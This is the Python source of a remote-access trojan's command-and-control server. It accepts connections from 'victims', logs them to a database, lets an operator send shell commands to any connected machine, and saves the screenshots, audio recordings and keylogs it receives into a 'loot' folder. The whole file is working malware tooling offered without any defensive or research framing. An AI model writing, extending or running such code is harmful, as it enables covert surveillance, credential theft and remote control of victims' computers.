import argparse
import os
import socket
import io
import json
import threading
import cryptography.fernet as fernet

from db import (
    init_db,
    insert_victim
)

parser = argparse.ArgumentParser(prog="Just a kiddie")
parser.add_argument('--host', required=True)
parser.add_argument('--port', required=True, type=int)


def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()

    conn, addr = server.accept()
    return conn, addr


def get_user_info(conn):
    banner = conn.recv(4096)
    user_info = json.loads(banner.decode())

    return user_info



def setup_storage(victim_id):
    base = os.path.join("loot", victim_id)
    
    os.makedirs(os.path.join(base, "screenshots"), exist_ok=True)
    os.makedirs(os.path.join(base, "audios"), exist_ok=True)
    os.makedirs(os.path.join(base, "keylogs"), exist_ok=True)
    
    return base


def save_received(base, category, filename, data):
    path = os.path.join(base, category, filename)

    with open(path, "wb") as f:
        f.write(data)
    

def unfold_parts(parts):
    type = parts[0]
    length = parts[1]
    extra = parts[2]
    key = parts[3].strip()

    return type, length, extra, key


def recv_banner(conn):
    banner = b""
    
    while not banner.endswith(b"\n"):
        banner += conn.recv(1)

    return banner.decode().strip()


def recv_data(conn, length):
    data = b""

    while len(data) < length:
        chunk = conn.recv(min(4096, length - len(data)))
        if not chunk: 
            break
        data += chunk

    return data


def decrypt_packet(data, key):
    if not key or key == "None":
        return data

    try:
        cipher_suite = fernet.Fernet(key)
        decrypted_data = cipher_suite.decrypt(data)
        return decrypted_data
    
    except Exception as e:
        print(f"Erro ao descriptografar dados: {e}")
        return None
    

def list_victims(victims, victims_lock):
    with victims_lock:
        for vid in victims:
            print(f"  - {vid}")


def switch_victim(new_victim, victims, victims_lock):
    with victims_lock:
        if new_victim in victims:
            print(f"[i] Switched to {new_victim}")
            return new_victim
        else:
            print("[!] Victim not found")
            return None


def send_command(selected, user_input, victims, victims_lock):
    with victims_lock:
        if selected not in victims:
            print("[!] Selected victim disconnected")
            return None
        
        victim_conn = victims[selected]['conn']
    
    try:
        victim_conn.send(user_input.encode())
        return victim_conn
    
    except (BrokenPipeError, ConnectionResetError):
        print("[!] Error sending command")
        return None


def main(conn, addr, victims, victims_lock):
    cwd = "~"
    
    user_info = get_user_info(conn=conn)
    victim_id = user_info["vic_id"]
    
    with victims_lock:
        victims[victim_id] = {
            'conn': conn, 
            'addr': addr, 
            'cwd': cwd,
            'base': setup_storage(victim_id)
        }
    
    insert_victim(user_info)
    print(f"[i] Connected: {addr[0]}:{addr[1]} ({victim_id})")

    selected = victim_id
    
    try:
        while True:
            with victims_lock:
                if selected not in victims:
                    print("[!] Selected victim disconnected")
                    break
                cwd = victims[selected]['cwd']
                base = victims[selected]['base']  
            
            user_input = input(f"[{selected}] {cwd} > ").strip()
            
            if user_input == "@vics":
                list_victims(victims, victims_lock)
                continue
            
            if user_input.startswith("@"):
                new_victim = user_input[1:]
                new_selected = switch_victim(new_victim, victims, victims_lock)
                
                if new_selected:
                    selected = new_selected

                continue
            
            victim_conn = send_command(selected, user_input, victims, victims_lock)
            if not victim_conn:
                continue
            
            banner = recv_banner(victim_conn)
            parts = banner.split("|")
            type, length, extra, key = unfold_parts(parts)
            received_data = recv_data(victim_conn, int(length))
            decrypted_data = decrypt_packet(received_data, key)

            match type:
                case "PNG":
                    save_received(base, "screenshots", extra, decrypted_data)
                case "WAV":
                    save_received(base, "audios", extra, decrypted_data)
                case "TMP":
                    save_received(base, "keylogs", extra, decrypted_data)
                case "CWD":
                    with victims_lock:
                        victims[selected]['cwd'] = extra
                case _:
                    print(decrypted_data.decode())
    
    except (ConnectionResetError, BrokenPipeError):
        print(f"[!] Victim {victim_id} disconnected")
    
    finally:
        with victims_lock:
            del victims[victim_id]


def run():
    init_db()
    args = parser.parse_args()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((args.host, args.port))
    server.listen(5)

    victims = {}
    victims_lock = threading.Lock() 
    
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=main, args=(conn, addr, victims, victims_lock), daemon=True)
        thread.start()


if __name__ == "__main__":
    run()